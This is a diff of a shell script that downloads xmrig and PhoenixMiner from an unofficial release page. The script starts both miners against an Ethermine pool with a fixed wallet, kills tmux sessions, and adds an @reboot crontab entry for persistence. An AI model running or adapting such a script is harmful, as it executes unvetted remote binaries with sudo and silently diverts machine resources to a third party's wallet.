@@ -1,7 +1,6 @@
 #!/bin/sh
 sudo sysctl -p
 sudo apt-get update
-cd $HOME/
 sudo apt-get -y -qq upgrade
 sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
 sudo apt-get install linux-headers-$(uname -r)
@@ -18,12 +17,11 @@ tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
 echo '#!/bin/sh'>>start.sh
-echo "cd $HOME/">>start.sh
 echo "sudo screen -dmS xmrig ./xmrig-v5.11.1/xmrig &">>start.sh
 echo "tmux kill-server">>start.sh
 echo "sleep 1">>start.sh
 echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image1 -pass x'">>start.sh
-echo "@reboot  sh $HOME/start.sh">> resmi
+echo "@reboot  sh start.sh">> resmi
 crontab resmi
 sudo rm resmi
 sudo reboot
